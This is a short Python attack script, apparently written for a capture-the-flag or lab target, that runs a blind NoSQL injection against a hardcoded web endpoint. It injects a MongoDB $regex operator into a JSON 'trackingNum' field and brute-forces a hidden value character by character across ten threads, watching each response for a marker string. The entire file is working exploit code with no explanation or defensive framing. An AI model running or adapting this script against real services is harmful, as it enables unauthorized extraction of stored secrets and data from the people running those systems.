import requests,string
from concurrent.futures import ThreadPoolExecutor, as_completed

def check(payload):
    import requests

    session = requests.session()

    burp0_url = "http://94.237.51.90:50385/index.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-type": "application/json", "Origin": "http://94.237.51.90:50385", "Connection": "keep-alive", "Referer": "http://94.237.51.90:50385/", "DNT": "1", "Sec-GPC": "1", "Priority": "u=0"}
    burp0_json={"trackingNum": {"$regex": "^"+payload+".*"}}
    text = session.post(burp0_url, headers=burp0_headers, json=burp0_json).text
    if "bmdyy" in text:
        return payload
    else:
        return False
    

executor = ThreadPoolExecutor(max_workers=10)
guesschar = string.ascii_letters + "{}"
guesschar = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_@"


guessed = ""

while True:
    print("==========================")
    all_task = []
    noResult = True
    for x in guesschar:
        task = executor.submit(check, guessed+x)
        all_task.append(task)

    for future in as_completed(all_task):
        if future.result():
            guessed = future.result()
            noResult = False
            print(guessed)

    if noResult:
        break
